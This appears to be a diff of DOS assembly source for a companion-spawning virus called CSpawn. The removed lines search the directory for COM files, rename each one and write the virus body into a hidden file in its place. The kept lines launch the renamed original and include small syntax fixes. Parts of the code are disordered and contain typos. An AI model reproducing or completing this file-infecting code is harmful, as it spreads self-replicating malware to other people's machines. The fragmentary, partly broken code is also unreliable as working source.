@@ -1,44 +1,11 @@
-mov sp,OFFSET FINISH + 100H
-mov ah,4AH
-mov bx,(OFFSET FINISH )/16 +11H
-mov dx,OFFSET SPAWN_NAME
-mov bx,OFFSET PARAM_BLK
-mov ax,4B00H
-int 21H
-mov dx,OFFSET COM_MASK
-mov ah,4EH
-xor cx,cx
-SLOOP: int 21H
-    jc SDONE
-    call INFECT_FILE
-    mov ah,4FH
-    jmp SLOOP
-SDONE:
-    mov a,1AH
-    mov dx,80H
-    int 21H
-DTA DB 43 dup(?)
 
-mov ah,1AH
-mov dx,OFFSET DTA
 
-int 21H
+REAL_NAME db 13 dup (?)
 
-mov dx,9EH
-mov di,OFFSET SPAWN_NAME
-
-mov ah,56H
-int 21H
-mov ah,3CH
-mov cx,3
-mov dx,9EH
-int 21H
-
-mov ah,40H 
-mov cx,FINISH-CSpawn
-mov dx,100H
-int 21H
-
+PARAM_BLK DW ?
+    DD 80H
+    DD 5CH
+    DD 6CH
 mov bx,OFFSET PARAM_BLK
 mov ax,4B00H
 int 21H
@@ -81,7 +48,7 @@ INF_LOOP:
     stosb
     or al,al
     jnz INFECT_FILE
-    mov WORD PTR [di-2],'N
+    mov WORD PTR [di-2],'N'
     mov dx,9EH
     mov di,OFFSET REAL_NAME
     mov ah,56H
@@ -94,18 +61,13 @@ INF_LOOP:
 
     mov bx,ax
     mov ah,40H 
-    mov cx,FIND_DONE -  CSpawn\
+    mov cx,FINISH -  CSpawn
     mov dx,OFFSET CSpawn
     int 21H
 
 INF_EXIT: ret
 
-REAL_NAME db 13 dup (?)
 
-PARAM_BLK DW ?
-    DD 80H
-    DD 5CH
-    DD 6CH
 
 FINISH:
     end CSpawn
